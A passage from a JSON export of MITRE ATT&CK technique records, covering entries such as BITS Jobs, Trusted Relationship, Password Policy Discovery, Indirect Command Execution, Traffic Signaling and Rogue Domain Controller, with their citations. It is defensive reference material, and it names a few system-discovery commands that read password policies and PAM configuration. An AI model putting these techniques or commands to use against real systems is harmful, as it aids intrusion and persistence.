        "description": "Florio, E. (2007, May 9). Malware Update with Windows Update. Retrieved January 12, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "PaloAlto UBoatRAT Nov 2017",
        "url": "https://researchcenter.paloaltonetworks.com/2017/11/unit42-uboatrat-navigates-east-asia/",
        "description": "Hayashi, K. (2017, November 28). UBoatRAT Navigates East Asia. Retrieved January 12, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Issues with BITS July 2011",
        "url": "https://technet.microsoft.com/library/dd939934.aspx",
        "description": "Microsoft. (2011, July 19). Issues with BITS. Retrieved January 12, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--c8e87b83-edbb-48d4-9295-4974897525b7",
    "platform": "windows",
    "tid": "T1197",
    "technique": "BITS Jobs",
    "tactic": "persistence",
    "datasources": "packet-capture|process-command-line-parameters|process-monitoring|windows-event-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse BITS jobs to persistently execute or clean up after malicious payloads. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through <a href=\"https://attack.mitre.org/techniques/T1559/001\">Component Object Model</a> (COM). (Citation: Microsoft COM) (Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.<!-- raw HTML omitted --><!-- raw HTML omitted -->The interface to create and manage BITS jobs is accessible through <a href=\"https://attack.mitre.org/techniques/T1059/001\">PowerShell</a>  (Citation: Microsoft BITS) and the <a href=\"https://attack.mitre.org/software/S0190\">BITSAdmin</a> tool. (Citation: Microsoft BITSAdmin)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may abuse BITS to download, execute, and even clean up after running malicious code. BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls. (Citation: CTU BITS Malware June 2016) (Citation: Mondok Windows PiggyBack BITS May 2007) (Citation: Symantec BITS May 2007) BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots). (Citation: PaloAlto UBoatRAT Nov 2017) (Citation: CTU BITS Malware June 2016)<!-- raw HTML omitted --><!-- raw HTML omitted -->BITS upload functionalities can also be used to perform <a href=\"https://attack.mitre.org/techniques/T1048\">Exfiltration Over Alternative Protocol</a>. (Citation: CTU BITS Malware June 2016)</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft COM",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms680573.aspx",
        "description": "Microsoft. (n.d.). Component Object Model (COM). Retrieved November 22, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft BITS",
        "url": "https://msdn.microsoft.com/library/windows/desktop/bb968799.aspx",
        "description": "Microsoft. (n.d.). Background Intelligent Transfer Service. Retrieved January 12, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft BITSAdmin",
        "url": "https://msdn.microsoft.com/library/aa362813.aspx",
        "description": "Microsoft. (n.d.). BITSAdmin Tool. Retrieved January 12, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "CTU BITS Malware June 2016",
        "url": "https://www.secureworks.com/blog/malware-lingers-with-bits",
        "description": "Counter Threat Unit Research Team. (2016, June 6). Malware Lingers with BITS. Retrieved January 12, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Mondok Windows PiggyBack BITS May 2007",
        "url": "https://arstechnica.com/information-technology/2007/05/malware-piggybacks-on-windows-background-intelligent-transfer-service/",
        "description": "Mondok, M. (2007, May 11). Malware piggybacks on Windows’ Background Intelligent Transfer Service. Retrieved January 12, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Symantec BITS May 2007",
        "url": "https://www.symantec.com/connect/blogs/malware-update-windows-update",
        "description": "Florio, E. (2007, May 9). Malware Update with Windows Update. Retrieved January 12, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "PaloAlto UBoatRAT Nov 2017",
        "url": "https://researchcenter.paloaltonetworks.com/2017/11/unit42-uboatrat-navigates-east-asia/",
        "description": "Hayashi, K. (2017, November 28). UBoatRAT Navigates East Asia. Retrieved January 12, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Issues with BITS July 2011",
        "url": "https://technet.microsoft.com/library/dd939934.aspx",
        "description": "Microsoft. (2011, July 19). Issues with BITS. Retrieved January 12, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--9fa07bef-9c81-421e-a8e5-ad4366c5a925",
    "platform": "linux|windows|macos|aws|gcp|azure|saas",
    "tid": "T1199",
    "technique": "Trusted Relationship",
    "tactic": "initial-access",
    "datasources": "application-logs|authentication-logs|aws-cloudtrail-logs|azure-activity-logs|stackdriver-logs|third-party-application-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship exploits an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.<!-- raw HTML omitted --><!-- raw HTML omitted -->Organizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider’s access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, <a href=\"https://attack.mitre.org/techniques/T1078\">Valid Accounts</a> used by the other party for access to internal network systems may be compromised and used.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--d40239b3-05ff-46d8-9bdd-b46d13463ef9",
    "platform": "windows|linux|macos",
    "tid": "T1200",
    "technique": "Hardware Additions",
    "tactic": "initial-access",
    "datasources": "asset-management|data-loss-prevention",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may introduce computer accessories, computers, or networking hardware into a system or network that can be used as a vector to gain access. While public references of usage by APT groups are scarce, many penetration testers leverage hardware additions for initial access. Commercial and open source products are leveraged with capabilities such as passive network tapping (Citation: Ossmann Star Feb 2011), man-in-the middle encryption breaking (Citation: Aleks Weapons Nov 2015), keystroke injection (Citation: Hak5 RubberDuck Dec 2016), kernel memory reading via DMA (Citation: Frisk DMA August 2016), adding new wireless access to an existing network (Citation: McMillan Pwn March 2012), and others.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/440.html",
        "description": "none",
        "external_id": "CAPEC-440"
      },
      {
        "source_name": "Ossmann Star Feb 2011",
        "url": "https://ossmann.blogspot.com/2011/02/throwing-star-lan-tap.html",
        "description": "Michael Ossmann. (2011, February 17). Throwing Star LAN Tap. Retrieved March 30, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Aleks Weapons Nov 2015",
        "url": "http://www.bsidesto.ca/2015/slides/Weapons_of_a_Penetration_Tester.pptx",
        "description": "Nick Aleks. (2015, November 7). Weapons of a Pentester - Understanding the virtual & physical tools used by white/black hat hackers. Retrieved March 30, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Hak5 RubberDuck Dec 2016",
        "url": "https://www.hak5.org/blog/main-blog/stealing-files-with-the-usb-rubber-ducky-usb-exfiltration-explained",
        "description": "Hak5. (2016, December 7). Stealing Files with the USB Rubber Ducky – USB Exfiltration Explained. Retrieved March 30, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Frisk DMA August 2016",
        "url": "https://www.youtube.com/watch?v=fXthwl6ShOg",
        "description": "Ulf Frisk. (2016, August 5). Direct Memory Attack the Kernel. Retrieved March 30, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "McMillan Pwn March 2012",
        "url": "https://arstechnica.com/information-technology/2012/03/the-pwn-plug-is-a-little-white-box-that-can-hack-your-network/",
        "description": "Robert McMillan. (2012, March 3). The Pwn Plug is a little white box that can hack your network. Retrieved March 30, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--b6075259-dba3-44e9-87c7-e954f37ec0d5",
    "platform": "windows|linux|macos",
    "tid": "T1201",
    "technique": "Password Policy Discovery",
    "tactic": "discovery",
    "datasources": "process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to access detailed information about the password policy used within an enterprise network. Password policies for networks are a way to enforce complex passwords that are difficult to guess or crack through <a href=\"https://attack.mitre.org/techniques/T1110\">Brute Force</a>. This would help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as ‘pass123’; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).<!-- raw HTML omitted --><!-- raw HTML omitted -->Password policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as <!-- raw HTML omitted -->net accounts (/domain)<!-- raw HTML omitted -->, <!-- raw HTML omitted -->Get-ADDefaultDomainPasswordPolicy<!-- raw HTML omitted -->, <!-- raw HTML omitted -->chage -l <!-- raw HTML omitted --><!-- raw HTML omitted -->, <!-- raw HTML omitted -->cat /etc/pam.d/common-password<!-- raw HTML omitted -->, and <!-- raw HTML omitted -->pwpolicy getaccountpolicies<!-- raw HTML omitted -->.(Citation: Superuser Linux Password Policies) (Citation: Jamf User Password Policies)</p>\n",
    "technique_references": [
      {
        "source_name": "Superuser Linux Password Policies",
        "url": "https://superuser.com/questions/150675/how-to-display-password-policy-information-for-a-user-ubuntu",
        "description": "Matutiae, M. (2014, August 6). How to display password policy information for a user (Ubuntu)?. Retrieved April 5, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Jamf User Password Policies",
        "url": "https://www.jamf.com/jamf-nation/discussions/18574/user-password-policies-on-non-ad-machines",
        "description": "Holland, J. (2016, January 25). User password policies on non AD machines. Retrieved April 5, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--3b0e52ce-517a-4614-a523-1bd5deef6c5e",
    "platform": "windows",
    "tid": "T1202",
    "technique": "Indirect Command Execution",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring|windows-event-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking <a href=\"https://attack.mitre.org/software/S0106\">cmd</a>. For example, <a href=\"https://attack.mitre.org/software/S0193\">Forfiles</a>, the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a <a href=\"https://attack.mitre.org/techniques/T1059\">Command and Scripting Interpreter</a>, Run window, or via scripts. (Citation: VectorSec ForFiles Aug 2017) (Citation: Evi1cg Forfiles Nov 2017)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may abuse these features for <a href=\"https://attack.mitre.org/tactics/TA0005\">Defense Evasion</a>, specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of <a href=\"https://attack.mitre.org/software/S0106\">cmd</a> or file extensions more commonly associated with malicious payloads.</p>\n",
    "technique_references": [
      {
        "source_name": "VectorSec ForFiles Aug 2017",
        "url": "https://twitter.com/vector_sec/status/896049052642533376",
        "description": "vector_sec. (2017, August 11). Defenders watching launches of cmd? What about forfiles?. Retrieved January 22, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Evi1cg Forfiles Nov 2017",
        "url": "https://twitter.com/Evi1cg/status/935027922397573120",
        "description": "Evi1cg. (2017, November 26). block cmd.exe ? try this :. Retrieved January 22, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "RSA Forfiles Aug 2017",
        "url": "https://community.rsa.com/community/products/netwitness/blog/2017/08/14/are-you-looking-out-for-forfilesexe-if-you-are-watching-for-cmdexe",
        "description": "Partington, E. (2017, August 14). Are you looking out for forfiles.exe (if you are watching for cmd.exe). Retrieved January 22, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--be2dcee9-a7a7-4e38-afd6-21b31ecc3d63",
    "platform": "linux|windows|macos",
    "tid": "T1203",
    "technique": "Exploitation for Client Execution",
    "tactic": "execution",
    "datasources": "anti-virus|process-monitoring|system-calls",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.<!-- raw HTML omitted --><!-- raw HTML omitted -->Several types exist:<!-- raw HTML omitted --><!-- raw HTML omitted -->### Browser-based Exploitation<!-- raw HTML omitted --><!-- raw HTML omitted -->Web browsers are a common target through <a href=\"https://attack.mitre.org/techniques/T1189\">Drive-by Compromise</a> and <a href=\"https://attack.mitre.org/techniques/T1566/002\">Spearphishing Link</a>. Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.<!-- raw HTML omitted --><!-- raw HTML omitted -->### Office Applications<!-- raw HTML omitted --><!-- raw HTML omitted -->Common office and productivity applications such as Microsoft Office are also targeted through <a href=\"https://attack.mitre.org/techniques/T1566\">Phishing</a>. Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.<!-- raw HTML omitted --><!-- raw HTML omitted -->### Common Third-party Applications<!-- raw HTML omitted --><!-- raw HTML omitted -->Other applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--8c32eb4d-805f-4fc5-bf60-c4d476c131b5",
    "platform": "linux|windows|macos",
    "tid": "T1204",
    "technique": "User Execution",
    "tactic": "execution",
    "datasources": "anti-virus|process-command-line-parameters|process-monitoring",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1204.001",
      "T1204.002"
    ],
    "count_subtechniques": 2,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of <a href=\"https://attack.mitre.org/techniques/T1566\">Phishing</a>.<!-- raw HTML omitted --><!-- raw HTML omitted -->While <a href=\"https://attack.mitre.org/techniques/T1204\">User Execution</a> frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user’s desktop hoping that a user will click on it. This activity may also be seen shortly after <a href=\"https://attack.mitre.org/techniques/T1534\">Internal Spearphishing</a>.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--451a9977-d255-43c9-b431-66de80130c8c",
    "platform": "linux|macos|windows|network",
    "tid": "T1205",
    "technique": "Traffic Signaling",
    "tactic": "defense-evasion",
    "datasources": "netflow-enclave-netflow|packet-capture",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1205.001"
    ],
    "count_subtechniques": 1,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. <a href=\"https://attack.mitre.org/techniques/T1205/001\">Port Knocking</a>), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).<!-- raw HTML omitted --><!-- raw HTML omitted -->The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.<!-- raw HTML omitted --><!-- raw HTML omitted -->On network devices, adversaries may use crafted packets to enable <a href=\"https://attack.mitre.org/techniques/T1556/004\">Network Device Authentication</a> for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.(Citation: Cisco Synful Knock Evolution) (Citation: FireEye - Synful Knock) (Citation: Cisco Blog Legacy Device Attacks)  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage <a href=\"https://attack.mitre.org/techniques/T1601/001\">Patch System Image</a> due to the monolithic nature of the architecture.</p>\n",
    "technique_references": [
      {
        "source_name": "Hartrell cd00r 2002",
        "url": "https://www.giac.org/paper/gcih/342/handle-cd00r-invisible-backdoor/103631",
        "description": "Hartrell, Greg. (2002, August). Get a handle on cd00r: The invisible backdoor. Retrieved October 13, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco Synful Knock Evolution",
        "url": "https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices",
        "description": "Graham Holmes. (2015, October 8). Evolution of attacks on Cisco IOS devices. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye - Synful Knock",
        "url": "https://www.fireeye.com/blog/threat-research/2015/09/synful_knock_-_acis.html",
        "description": "Bill Hau, Tony Lee, Josh Homan. (2015, September 15). SYNful Knock - A Cisco router implant - Part I. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco Blog Legacy Device Attacks",
        "url": "https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954",
        "description": "Omar Santos. (2020, October 19). Attackers Continue to Target Legacy Devices. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--451a9977-d255-43c9-b431-66de80130c8c",
    "platform": "linux|macos|windows|network",
    "tid": "T1205",
    "technique": "Traffic Signaling",
    "tactic": "persistence",
    "datasources": "netflow-enclave-netflow|packet-capture",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1205.001"
    ],
    "count_subtechniques": 1,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. <a href=\"https://attack.mitre.org/techniques/T1205/001\">Port Knocking</a>), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).<!-- raw HTML omitted --><!-- raw HTML omitted -->The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.<!-- raw HTML omitted --><!-- raw HTML omitted -->On network devices, adversaries may use crafted packets to enable <a href=\"https://attack.mitre.org/techniques/T1556/004\">Network Device Authentication</a> for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.(Citation: Cisco Synful Knock Evolution) (Citation: FireEye - Synful Knock) (Citation: Cisco Blog Legacy Device Attacks)  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage <a href=\"https://attack.mitre.org/techniques/T1601/001\">Patch System Image</a> due to the monolithic nature of the architecture.</p>\n",
    "technique_references": [
      {
        "source_name": "Hartrell cd00r 2002",
        "url": "https://www.giac.org/paper/gcih/342/handle-cd00r-invisible-backdoor/103631",
        "description": "Hartrell, Greg. (2002, August). Get a handle on cd00r: The invisible backdoor. Retrieved October 13, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco Synful Knock Evolution",
        "url": "https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices",
        "description": "Graham Holmes. (2015, October 8). Evolution of attacks on Cisco IOS devices. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye - Synful Knock",
        "url": "https://www.fireeye.com/blog/threat-research/2015/09/synful_knock_-_acis.html",
        "description": "Bill Hau, Tony Lee, Josh Homan. (2015, September 15). SYNful Knock - A Cisco router implant - Part I. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco Blog Legacy Device Attacks",
        "url": "https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954",
        "description": "Omar Santos. (2020, October 19). Attackers Continue to Target Legacy Devices. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--451a9977-d255-43c9-b431-66de80130c8c",
    "platform": "linux|macos|windows|network",
    "tid": "T1205",
    "technique": "Traffic Signaling",
    "tactic": "command-and-control",
    "datasources": "netflow-enclave-netflow|packet-capture",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1205.001"
    ],
    "count_subtechniques": 1,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. <a href=\"https://attack.mitre.org/techniques/T1205/001\">Port Knocking</a>), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).<!-- raw HTML omitted --><!-- raw HTML omitted -->The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.<!-- raw HTML omitted --><!-- raw HTML omitted -->On network devices, adversaries may use crafted packets to enable <a href=\"https://attack.mitre.org/techniques/T1556/004\">Network Device Authentication</a> for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.(Citation: Cisco Synful Knock Evolution) (Citation: FireEye - Synful Knock) (Citation: Cisco Blog Legacy Device Attacks)  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage <a href=\"https://attack.mitre.org/techniques/T1601/001\">Patch System Image</a> due to the monolithic nature of the architecture.</p>\n",
    "technique_references": [
      {
        "source_name": "Hartrell cd00r 2002",
        "url": "https://www.giac.org/paper/gcih/342/handle-cd00r-invisible-backdoor/103631",
        "description": "Hartrell, Greg. (2002, August). Get a handle on cd00r: The invisible backdoor. Retrieved October 13, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco Synful Knock Evolution",
        "url": "https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices",
        "description": "Graham Holmes. (2015, October 8). Evolution of attacks on Cisco IOS devices. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye - Synful Knock",
        "url": "https://www.fireeye.com/blog/threat-research/2015/09/synful_knock_-_acis.html",
        "description": "Bill Hau, Tony Lee, Josh Homan. (2015, September 15). SYNful Knock - A Cisco router implant - Part I. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco Blog Legacy Device Attacks",
        "url": "https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954",
        "description": "Omar Santos. (2020, October 19). Attackers Continue to Target Legacy Devices. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--564998d8-ab3e-4123-93fb-eccaa6b9714a",
    "platform": "windows",
    "tid": "T1207",
    "technique": "Rogue Domain Controller",
    "tactic": "defense-evasion",
    "datasources": "api-monitoring|authentication-logs|network-protocol-analysis|packet-capture",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. (Citation: DCShadow Blog) Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.<!-- raw HTML omitted --><!-- raw HTML omitted -->Registering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)<!-- raw HTML omitted --><!-- raw HTML omitted -->This technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform <a href=\"https://attack.mitre.org/techniques/T1178\">SID-History Injection</a> and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. (Citation: DCShadow Blog)</p>\n",
    "technique_references": [
      {
        "source_name": "DCShadow Blog",
        "url": "https://www.dcshadow.com/",
        "description": "Delpy, B. & LE TOUX, V. (n.d.). DCShadow. Retrieved March 20, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Adsecurity Mimikatz Guide",
        "url": "https://adsecurity.org/?page_id=1821",
        "description": "Metcalf, S. (2015, November 13). Unofficial Guide to Mimikatz & Command Reference. Retrieved December 23, 2015.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub DCSYNCMonitor",
        "url": "https://github.com/shellster/DCSYNCMonitor",
        "description": "Spencer S. (2018, February 22). DCSYNCMonitor. Retrieved March 30, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft DirSync",
        "url": "https://msdn.microsoft.com/en-us/library/ms677626.aspx",
        "description": "Microsoft. (n.d.). Polling for Changes Using the DirSync Control. Retrieved March 30, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "ADDSecurity DCShadow Feb 2018",
        "url": "https://adds-security.blogspot.fr/2018/02/detecter-dcshadow-impossible.html",
        "description": "Lucand,G. (2018, February 18). Detect DCShadow, impossible?. Retrieved March 30, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
    "platform": "linux|windows|macos",
    "tid": "T1210",
    "technique": "Exploitation of Remote Services",
    "tactic": "lateral-movement",
    "datasources": "file-monitoring|process-monitoring|windows-error-reporting",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
